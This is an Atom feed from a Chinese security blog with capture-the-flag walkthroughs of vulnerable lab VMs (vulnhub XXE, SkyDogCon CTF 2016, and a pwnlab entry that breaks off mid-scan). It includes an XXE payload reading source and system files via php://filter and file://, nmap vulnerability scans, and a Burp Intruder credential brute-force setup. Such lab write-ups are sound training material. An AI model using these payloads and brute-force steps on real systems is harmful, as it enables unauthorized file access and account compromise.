<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>gwolfs的个人博客</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://blog.ydq6.com/"/>
  <updated>2020-05-12T14:40:52.640Z</updated>
  <id>http://blog.ydq6.com/</id>
  
  <author>
    <name>gwolfs</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>vulnhub_xxe</title>
    <link href="http://blog.ydq6.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/vulnhub-xxe/"/>
    <id>http://blog.ydq6.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/vulnhub-xxe/</id>
    <published>2020-05-12T14:36:41.000Z</published>
    <updated>2020-05-12T14:40:52.640Z</updated>
    
    <content type="html"><![CDATA[<h1 id="vulnhub-xxe实验"><a href="#vulnhub-xxe实验" class="headerlink" title="vulnhub xxe实验"></a>vulnhub xxe实验</h1><h2 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="(1)主机发现"></a>(1)主机发现</h2><p>首先ifconfig查看当前ip地址： 10.1.1.92</p><p>然后利用netdiscover被动扫描扫描局域网机器。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -r 10.1.1.92/24</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20200512161540297.png" alt="image-20200512161540297"></p><p>发现两台机器，90，91，93</p><p>利用Nmap扫描端口：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim ip.txt #将要扫描的ip列表写进ip.txt</span><br><span class="line">nmap -sV -p 1-65535 -iL ip.txt -v</span><br></pre></td></tr></table></figure><p>结果如下：</p><p><img src="/assets/image-20200512163413524.png" alt="image-20200512163413524"></p><p><img src="/assets/image-20200512163430298.png" alt="image-20200512163430298"></p><p><img src="/assets/image-20200512163449465.png" alt="image-20200512163449465"></p><p>访问91机器，发现是apache目录，找到目标。</p><h2 id="（2）网站扫描"><a href="#（2）网站扫描" class="headerlink" title="（2）网站扫描"></a>（2）网站扫描</h2><p>利用kali的dirb扫描:</p><p><img src="/assets/image-20200512162428309.png" alt="image-20200512162428309"></p><p>关键文件：robots.txt</p><p>访问发现：</p><p><img src="/assets/image-20200512162501481.png" alt="image-20200512162501481"></p><p>可以访问xxe目录，发现有登录栏。</p><p>访问admin.php，发现400了。所以猜想可能是xxe下的admin.php</p><p>又发现一个登录页面。所以可以知道后面个登录是管理员登录，前面个登录是用户登录。</p><h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><p>访问10.1.1.91/xxe</p><p>输入Name和Password:</p><p><img src="/assets/image-20200512163534468.png" alt="image-20200512163534468"></p><p>抓包:</p><p><img src="/assets/image-20200512163659235.png" alt="image-20200512163659235"></p><p>发现请求是xml请求，猜想有xxe,验证一下。</p><p>构造payload,验证漏洞</p><p><img src="/assets/image-20200512164212079.png" alt="image-20200512164212079"></p><p>漏洞存在。</p><p>构造payload读取源码:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span>[<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read=convert.base64-encode/resource=xxe.php"</span>&gt;</span>] &gt;</span></span><br><span class="line"><span class="symbol">&amp;xxe;</span></span><br></pre></td></tr></table></figure><p><img src="/assets/image-20200512164305534.png" alt="image-20200512164305534"></p><p>然后再解码：</p><p><img src="/assets/image-20200512164400006.png" alt="image-20200512164400006"></p><p>成功读取，再读admin.php，并解码：</p><p><img src="/assets/image-20200512164625029.png" alt="image-20200512164625029"></p><p>查出账户名为administhebest。密码的md5为 e6e061838856bf47e1de730719fb2609，md5解密后为admin@123.</p><p>admin.php处输入账号密码：</p><p><img src="/assets/image-20200512164816064.png" alt="image-20200512164816064"></p><p>得到flag:</p><p><img src="/assets/image-20200512164834411.png" alt="image-20200512164834411"></p><p>点击后发现跳转空了，加一个xxe目录就可以。</p><p><img src="/assets/image-20200512164917137.png" alt="image-20200512164917137"></p><p>可能flag在源码里，那就读源码：</p><p><img src="/assets/image-20200512165013929.png" alt="image-20200512165013929"></p><p><img src="/assets/image-20200512165033499.png" alt="image-20200512165033499"></p><p>得到flag：JQZFMMCZPE4HKWTNPBUFU6JVO5QUQQJ5。</p><p>flag还可以再解码： L2V0Yy8uZmxhZy5waHA= </p><p>再base64解码：</p><p>/etc/.flag.php</p><p>再读，由于是在etc目录下，所以用file协议读：</p><p><img src="/assets/image-20200512165748626.png" alt="image-20200512165748626"></p><p>很明显有加密，本地解密得到:</p><p><img src="/assets/image-20200512170140547.png" alt="image-20200512170140547"></p><p>发现不成功，原来是最后的?&gt;标识符打错了。</p><p>重写后发现访问虽然成功了，但是没有结果。重新换一台windows电脑解密即可，flag:</p><p>SAFCSP{xxe_is_so_easy}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;vulnhub-xxe实验&quot;&gt;&lt;a href=&quot;#vulnhub-xxe实验&quot; class=&quot;headerlink&quot; title=&quot;vulnhub xxe实验&quot;&gt;&lt;/a&gt;vulnhub xxe实验&lt;/h1&gt;&lt;h2 id=&quot;1-主机发现&quot;&gt;&lt;a href=&quot;#1-主
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://blog.ydq6.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="靶机" scheme="http://blog.ydq6.com/tags/%E9%9D%B6%E6%9C%BA/"/>
    
      <category term="web" scheme="http://blog.ydq6.com/tags/web/"/>
    
      <category term="xxe" scheme="http://blog.ydq6.com/tags/xxe/"/>
    
  </entry>
  
  <entry>
    <title>SkyConCTF2016靶机测试</title>
    <link href="http://blog.ydq6.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/SkyConCTF2016%E9%9D%B6%E6%9C%BA%E6%B5%8B%E8%AF%95/"/>
    <id>http://blog.ydq6.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/SkyConCTF2016%E9%9D%B6%E6%9C%BA%E6%B5%8B%E8%AF%95/</id>
    <published>2020-05-06T15:07:27.000Z</published>
    <updated>2020-05-06T15:17:15.654Z</updated>
    
    <content type="html"><![CDATA[<p>1、IP探测</p><p>netdiscover -i eth0</p><p>弹出mac地址08:00:27:d3:70:74对应的ip地址为192.168.43.248</p><a id="more"></a><p>2、扫描端口</p><p>(1)nmap -sV -O 192.168.43.248</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> skydogconctf2016 (192.168.43.248)</span><br><span class="line">Host is up (0.0019s latency).</span><br><span class="line"><span class="keyword">Not</span> shown: 997 filtered ports</span><br><span class="line">PORT    STATE <span class="built_in"> SERVICE </span> VERSION</span><br><span class="line">22/tcp  closed ssh</span><br><span class="line">80/tcp  open   http     Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">443/tcp open   ssl/http Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">MAC Address: 08:00:27:D3:70:74 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.10 - 4.8</span><br><span class="line">Network Distance: 1 hop</span><br></pre></td></tr></table></figure><p>只开了两个端口，80，443.Ubuntu系统</p><p>(2)扫描常见漏洞</p><p>nmap –script=vuln 192.168.43.248</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap <span class="number">7.50</span> ( https://nmap.org ) at <span class="number">2018</span><span class="number">-06</span><span class="number">-02</span> <span class="number">10</span>:<span class="number">06</span> CSTPre-scan script results:</span><br><span class="line">| broadcast-avahi-dos:</span><br><span class="line">|   Discovered hosts:</span><br><span class="line">|     <span class="number">224.0</span>.<span class="number">0.251</span></span><br><span class="line">|   After NULL UDP avahi packet DoS (CVE<span class="number">-2011</span><span class="number">-1002</span>).</span><br><span class="line">|_  Hosts are all up (not vulnerable).</span><br><span class="line">Nmap scan report for skydogconctf<span class="number">2016</span> (<span class="number">192.168</span>.<span class="number">43.248</span>)</span><br><span class="line">Host is up (<span class="number">0.00096</span>s latency).</span><br><span class="line">Not shown: <span class="number">997</span> filtered ports</span><br><span class="line">PORT    STATE  SERVICE</span><br><span class="line"><span class="number">22</span>/tcp  closed ssh</span><br><span class="line"><span class="number">80</span>/tcp  open   http</span><br><span class="line">|_http-csrf: Couldn't find any CSRF vulnerabilities.</span><br><span class="line">|_http-dombased-xss: Couldn't find any DOM based XSS.</span><br><span class="line">| http-slowloris-check:</span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE<span class="number">-2007</span><span class="number">-6750</span></span><br><span class="line">|       Slowloris tries <span class="keyword">to</span> keep many connections <span class="keyword">to</span> the <span class="keyword">target</span> web server open <span class="keyword">and</span> hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections <span class="keyword">to</span></span><br><span class="line">|       the <span class="keyword">target</span> web server <span class="keyword">and</span> sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server's resources causing Denial Of Service.</span><br><span class="line">|</span><br><span class="line">|     Disclosure date: <span class="number">2009</span><span class="number">-09</span><span class="number">-17</span></span><br><span class="line">|     References:</span><br><span class="line">|       http://ha.ckers.org/slowloris/</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE<span class="number">-2007</span><span class="number">-6750</span></span><br><span class="line">| http-sql-injection:</span><br><span class="line">|   Possible sqli for queries:</span><br><span class="line">|_    http://skydogconctf<span class="number">2016</span>/assets/js/<span class="keyword">c</span>,l.<span class="keyword">type</span>=a),l.width=l.height=<span class="symbol">%220</span><span class="symbol">%22</span>,l.onerror=l.onload=l.onreadystatechange=function()<span class="symbol">%7</span>bk.<span class="keyword">call</span>(this,r)<span class="symbol">%7</span>d,p.splice(e,<span class="number">0</span>,u),<span class="symbol">%22</span>img<span class="symbol">%22</span>!=a&amp;&amp;(r<span class="symbol">%7</span><span class="keyword">c</span><span class="symbol">%7</span><span class="keyword">c</span><span class="number">2</span>===y<span class="symbol">%5</span>bc<span class="symbol">%5</span>d?<span class="symbol">%28</span>t<span class="symbol">%2</span>einsertBefore<span class="symbol">%28</span>l<span class="symbol">%2</span>cs<span class="symbol">%3</span>fnull<span class="symbol">%3</span>an<span class="symbol">%29</span><span class="symbol">%2</span>cm<span class="symbol">%28</span>k<span class="symbol">%2</span>cj<span class="symbol">%29</span><span class="symbol">%29</span><span class="symbol">%3</span>ay<span class="symbol">%5</span>bc<span class="symbol">%5</span>d<span class="symbol">%2</span>epush<span class="symbol">%28</span>l<span class="symbol">%29</span><span class="symbol">%29</span><span class="symbol">%7</span>dfunction=<span class="symbol">%27</span><span class="symbol">%20</span>OR<span class="symbol">%20</span>sqlspider</span><br><span class="line">|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.</span><br><span class="line"><span class="number">443</span>/tcp open   https</span><br><span class="line">|_http-csrf: Couldn't find any CSRF vulnerabilities.</span><br><span class="line">|_http-dombased-xss: Couldn't find any DOM based XSS.</span><br><span class="line">| http-slowloris-check:</span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE<span class="number">-2007</span><span class="number">-6750</span></span><br><span class="line">|       Slowloris tries <span class="keyword">to</span> keep many connections <span class="keyword">to</span> the <span class="keyword">target</span> web server open <span class="keyword">and</span> hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections <span class="keyword">to</span></span><br><span class="line">|       the <span class="keyword">target</span> web server <span class="keyword">and</span> sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server's resources causing Denial Of Service.</span><br><span class="line">|</span><br><span class="line">|     Disclosure date: <span class="number">2009</span><span class="number">-09</span><span class="number">-17</span></span><br><span class="line">|     References:</span><br><span class="line">|       http://ha.ckers.org/slowloris/</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE<span class="number">-2007</span><span class="number">-6750</span></span><br><span class="line">| http-sql-injection:</span><br><span class="line">|   Possible sqli for queries:</span><br><span class="line">|_    https://skydogconctf<span class="number">2016</span>/assets/js/<span class="keyword">c</span>,l.<span class="keyword">type</span>=a),l.width=l.height=<span class="symbol">%220</span><span class="symbol">%22</span>,l.onerror=l.onload=l.onreadystatechange=function()<span class="symbol">%7</span>bk.<span class="keyword">call</span>(this,r)<span class="symbol">%7</span>d,p.splice(e,<span class="number">0</span>,u),<span class="symbol">%22</span>img<span class="symbol">%22</span>!=a&amp;&amp;(r<span class="symbol">%7</span><span class="keyword">c</span><span class="symbol">%7</span><span class="keyword">c</span><span class="number">2</span>===y<span class="symbol">%5</span>bc<span class="symbol">%5</span>d?<span class="symbol">%28</span>t<span class="symbol">%2</span>einsertBefore<span class="symbol">%28</span>l<span class="symbol">%2</span>cs<span class="symbol">%3</span>fnull<span class="symbol">%3</span>an<span class="symbol">%29</span><span class="symbol">%2</span>cm<span class="symbol">%28</span>k<span class="symbol">%2</span>cj<span class="symbol">%29</span><span class="symbol">%29</span><span class="symbol">%3</span>ay<span class="symbol">%5</span>bc<span class="symbol">%5</span>d<span class="symbol">%2</span>epush<span class="symbol">%28</span>l<span class="symbol">%29</span><span class="symbol">%29</span><span class="symbol">%7</span>dfunction=<span class="symbol">%27</span><span class="symbol">%20</span>OR<span class="symbol">%20</span>sqlspider</span><br><span class="line">|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.</span><br><span class="line">|_sslv<span class="number">2</span>-drown:</span><br></pre></td></tr></table></figure><p>发现一个点</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http-sql-<span class="string">injection:</span> </span><br><span class="line">Possible sqli <span class="keyword">for</span> <span class="string">queries:</span></span><br></pre></td></tr></table></figure><p>看来应该存在sql注入</p><p>3、进入服务器网页</p><p><img src="/assets/image-20180602100404515-1588777753200.png" alt="image-20180602100404515"></p><p>浏览下网页，发现下面有提示</p><p><img src="/assets/image-20180602100539377-1588777753201.png" alt="image-20180602100539377">4、获取flag</p><p>(1)第一个flag</p><p>根据上图的提示，不要去home,home中有一个十六进制。那么去Home试试。</p><p>/home</p><p>发现home根本不存在。</p><p>用zap扫一下网站，发现网站下有两个目录，一个是assets,一个是oldIE,有了以前的经验教训就先找oldIE,然后发现下面只有一个文件html5.js，打开后发现最上面醒目的标识着一个注释。</p><p><img src="/assets/image-20180602103843825-1588777753202.png" alt="image-20180602103843825"></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">666</span>c61677b37633031333230373061306566373164353432363633653964633166356465657d</span><br></pre></td></tr></table></figure><p>用十六机制转ASCII码解码得：</p><p>flag{7c0132070a0ef71d542663e9dc1f5dee}</p><p>（2）第二个flag</p><p>那第二个flag该怎么找呢？第二个那个flag提示相当于没有什么提示。一般这种题目后面个flag需要靠前面个flag寻找过程的帮助，但是前面个没有任何提示信息。怎么办？观察下flag里面的字符恰好是32位。</p><p>7c0132070a0ef71d542663e9dc1f5dee用md5解码后为nmap。</p><p>意思提示用nmap，可是刚刚已经扫过了一次，难道是先前没扫全？</p><p>重新扫一次</p><p>nmap -A 192.168.43.248</p><p>发现还是没有什么信息</p><p>那看一下端口吧,为了快速分为两次扫描</p><p>nmap -p 1000-20000 192.168.43.248</p><p>没有</p><p>nmap -sV -p 20000-65535 192.168.43.248</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE</span><br><span class="line">22222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)</span><br></pre></td></tr></table></figure><p>发现开了22222端口，而且服务是ssh服务，</p><p>连接试一下看看有没有弱密码：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">windows7phone% ssh -p <span class="number">22222</span> root@<span class="number">192.168</span><span class="number">.43</span><span class="number">.248</span></span><br><span class="line">The authenticity <span class="keyword">of</span> host '[<span class="number">192.168</span><span class="number">.43</span><span class="number">.248</span>]:<span class="number">22222</span> ([<span class="number">192.168</span><span class="number">.43</span><span class="number">.248</span>]:<span class="number">22222</span>)' can't be established.</span><br><span class="line">ECDSA key fingerprint <span class="keyword">is</span> SHA256:DeCMZ74o5wesBHFLyaVY7UTCA7mW+bx6WroHm6AgMqU.</span><br><span class="line">Are you sure you want <span class="keyword">to</span> <span class="keyword">continue</span> connecting (yes/no)? yes</span><br><span class="line">Warning: Permanently added '[<span class="number">192.168</span><span class="number">.43</span><span class="number">.248</span>]:<span class="number">22222</span>' (ECDSA) <span class="keyword">to</span> <span class="keyword">the</span> <span class="built_in">list</span> <span class="keyword">of</span> known hosts.</span><br><span class="line"></span><br><span class="line"><span class="comment">###### #</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># WARNING</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># FBI - Authorized access only!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Disconnect IMMEDIATELY if you are not an authorized user!!!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># All actions Will be monitored and recorded</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Flag&#123;53c82eba31f6d416f331de9162ebe997&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###### #</span></span><br></pre></td></tr></table></figure><p>结果直接弹出flag了，第二个flag get.Flag{53c82eba31f6d416f331de9162ebe997}</p><p>(3)第三个flag</p><p>有了先前的经验把第二个flag的值用md5解密后得encrypt</p><p>看来第三关是加密。再看看最先前的提示：“During his Travels Frank has Been Known to Intercept Traffic”</p><p>意思不安全，有人可以窃听流量。意思用http不安全？</p><p>那用https试下</p><p>发现证书错误,看一下证书,发现证书中没有flag，看了下解密不太可能。</p><p>于是看下是否还有其他可以利用的信息。</p><p>点击把证书添加例外后发现可以查看证书状态：</p><p><img src="/assets/image-20180602114356663-1588777753202.png" alt="image-20180602114356663"></p><p>点击进去看下。惊奇的发现里面有flag</p><p><img src="/assets/image-20180602114422355-1588777753202.png" alt="image-20180602114422355"></p><p>flag3{f82366a9ddc064585d54e3f78bde3221}</p><p>（4）第四个flag</p><p>再次解密上面的flag得到personnel,又结合提示“A Good Agent is Hard to Find”。看来是要改代理。可是personnel是为什么？难道是要代理改为全体人员吗？试了半天无果。于是又想这个单词会不会是个目录，输入/personnel,结果：</p><p><img src="/assets/image-20180602114948886-1588777753203.png" alt="image-20180602114948886"></p><p>拒绝访问，要FBI机构的。那怎么才是FBI机构的呢？在其他文件中找找线索。目前已知的好像只有html5.js和assets文件。</p><p>回到刚刚的html5.js文件查询FBI字符串发现：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/* maindev -  6/</span><span class="number">7</span><span class="regexp">/02 Adding temporary support for IE4 FBI Workstations */</span></span><br><span class="line"><span class="regexp">/* newmaindev -  5/</span><span class="number">22</span><span class="regexp">/16 Last maindev was and idoit and IE4 is still Gold image -@Support doug.perterson@fbi.gov */</span></span><br></pre></td></tr></table></figure><p>意思是使用IE4？</p><p>网上搜一下IE4版本的IE，在<a href="http://www.966266.com/jishu/ie-user-agent.html这个网站找到" target="_blank" rel="noopener">http://www.966266.com/jishu/ie-user-agent.html这个网站找到</a></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">**Internet Explorer <span class="number">4.0</span>**</span><br><span class="line"></span><br><span class="line">Mozilla/<span class="number">4.0</span> WebTV/<span class="number">2.6</span> (compatible; MSIE <span class="number">4.0</span>)</span><br><span class="line"></span><br><span class="line">Mozilla/<span class="number">4.0</span> (compatible; MSIE <span class="number">4.0</span>; Windows NT)</span><br><span class="line"></span><br><span class="line">Mozilla/<span class="number">4.0</span> (compatible; MSIE <span class="number">4.0</span>; Windows <span class="number">98</span> )</span><br><span class="line"></span><br><span class="line">Mozilla/<span class="number">4.0</span> (compatible; MSIE <span class="number">4.0</span>; Windows <span class="number">95</span>; .NET CLR <span class="number">1.1</span><span class="number">.4322</span>; .NET CLR <span class="number">2.0</span><span class="number">.50727</span>)</span><br><span class="line"></span><br><span class="line">Mozilla/<span class="number">4.0</span> (compatible; MSIE <span class="number">4.0</span>; Windows <span class="number">95</span>)</span><br><span class="line"></span><br><span class="line">Mozilla/<span class="number">4.0</span> (Compatible; MSIE <span class="number">4.0</span>)</span><br><span class="line"></span><br><span class="line">Mozilla/<span class="number">2.0</span> (compatible; MSIE <span class="number">4.0</span>; Windows <span class="number">98</span>)</span><br></pre></td></tr></table></figure><p>随便选一个Mozilla/4.0 (compatible; MSIE 4.0; Windows 95; .NET CLR 1.1.4322; .NET CLR 2.0.50727)利用User Agent插件改代理。如何所示。</p><p><img src="/assets/image-20180603155953564-1588777753203.png" alt="image-20180603155953564"></p><p>再次访问/personnel成功进入</p><p><img src="/assets/image-20180603160105406-1588777753203.png" alt="image-20180603160105406"></p><p>现在该找flag了,可以看到在右下角很清楚的实现flag</p><p>flag{14e10d570047667f904261e6d08f520f} </p><p>（5）第5个flag</p><p>将第5个flag解码后得evidence,再根据下面的提示clue=new +flag和第5条提示 “The Devil is in the Details - Or is it Dialogue? Either Way,  if it’s Simple, Guessable, or Personal it Goes Against Best Practices”。</p><p>看了提示还是没太懂，意思是新的证据？想一下clue为newevidence，是不是又像上一次personnel那个一样呢？</p><p>输入/newevidence进入果真出现新界面</p><p><img src="/assets/image-20180603162606699-1588777753203.png" alt="image-20180603162606699"></p><p>要求输入用户和密码。用户名密码是什么呢？提示只有FBI的人才能访问。那么肯定是输入一个FBI的账号密码。而且提示又说的简单的、可猜的，猜想可能是弱口令。于是爆破吧，先试了一下admin和root爆破，均没成功。那么肯定问题在于如何确定用户名。</p><p>前面的html.js中给出了一个邮箱：<a href="mailto:doug.perterson@fbi.gov">doug.perterson@fbi.gov</a>,根据这个邮箱可以猜想是一个用户名。</p><p>用doug.perterson爆破无果。那再去第四关去寻找一下线索。</p><p><img src="/assets/image-20180603165015569-1588777753203.png" alt="image-20180603165015569"></p><p>仔细浏览才发现这是一个FBI探员的个人页面。而且上面写了Hanratty探员，那用Hanratty再爆破试试，还是不行。换种思路先前都是一个英文单词.一个英文单词。</p><p>那这次是不是账号也要一个单词.一个单词呢？Hanratty的姓是什么？google一下</p><p><img src="/assets/image-20180603165641329-1588777753204.png" alt="image-20180603165641329"></p><p>然后发现是部电影，而且这电影我还看过，是猫鼠游戏，因为当初看的是中文版，所以不知道它的英文名字叫Catch me if you can,所以一直没发现，现在终于知道这个靶机要做什么了，肯定是Hanratty要抓Frank，而Frank东躲西藏。Hanratty的姓是Carl。</p><p>因为不清楚是姓在前还是名在前于是查了下doug.perterson，发现也是名在前姓在后。<img src="/assets/image-20180603170045319-1588777753204.png" alt="image-20180603170045319"></p><p>于是利用carl.hanratty去爆破。</p><p>现在具体的讲爆破</p><p>先用burpsuit抓包,输入admin,123</p><p><img src="/assets/image-20180603170440593-1588777753204.png" alt="image-20180603170440593"></p><p>发现有一串密文，用Base64解码后为admin:123，看来是根据账户:密码然后base64加密。</p><p>将请求发送给burp的Intruder，然后在刚刚密文的地方点击左侧的add$，使其成为变量</p><p><img src="/assets/image-20180603171745363-1588777753204.png" alt="image-20180603171745363"></p><p>在payload下Payload Processing上添加base64编码方式</p><p><img src="/assets/image-20180603171824459-1588777753204.png" alt="image-20180603171824459"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;1、IP探测&lt;/p&gt;
&lt;p&gt;netdiscover -i eth0&lt;/p&gt;
&lt;p&gt;弹出mac地址08:00:27:d3:70:74对应的ip地址为192.168.43.248&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://blog.ydq6.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="靶机" scheme="http://blog.ydq6.com/tags/%E9%9D%B6%E6%9C%BA/"/>
    
      <category term="web" scheme="http://blog.ydq6.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>pwnlab靶机测试</title>
    <link href="http://blog.ydq6.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/pwnlab%E9%9D%B6%E6%9C%BA%E6%B5%8B%E8%AF%95/"/>
    <id>http://blog.ydq6.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/pwnlab%E9%9D%B6%E6%9C%BA%E6%B5%8B%E8%AF%95/</id>
    <published>2020-05-06T14:56:33.000Z</published>
    <updated>2020-05-06T15:16:57.868Z</updated>
    
    <content type="html"><![CDATA[<p>一、探测ip</p><p>netdicover -i eth0</p><a id="more"></a><p>二、扫描ip</p><p>nmap -sV -A 192.168.43.18</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">windows7phone%</span> <span class="string">nmap</span> <span class="string">-sV</span> <span class="string">-A</span> <span class="number">192.168</span><span class="number">.43</span><span class="number">.18</span></span><br><span class="line"></span><br><span class="line"><span class="string">Starting</span> <span class="string">Nmap</span> <span class="number">7.50</span> <span class="string">(</span> <span class="string">https://nmap.org</span> <span class="string">)</span> <span class="string">at</span> <span class="number">2018</span><span class="number">-06</span><span class="number">-05</span> <span class="number">18</span><span class="string">:29</span> <span class="string">CST</span></span><br><span class="line"><span class="string">Nmap</span> <span class="string">scan</span> <span class="string">report</span> <span class="string">for</span> <span class="string">pwnlab</span> <span class="string">(192.168.43.18)</span></span><br><span class="line"><span class="string">Host</span> <span class="string">is</span> <span class="string">up</span> <span class="string">(0.00090s</span> <span class="string">latency).</span></span><br><span class="line"><span class="attr">Not shown:</span> <span class="number">997</span> <span class="string">filtered</span> <span class="string">ports</span></span><br><span class="line"><span class="string">PORT</span>     <span class="string">STATE</span> <span class="string">SERVICE</span> <span class="string">VERSION</span></span><br><span class="line"><span class="number">80</span><span class="string">/tcp</span>   <span class="string">open</span>  <span class="string">http</span>    <span class="string">Apache</span> <span class="string">httpd</span> <span 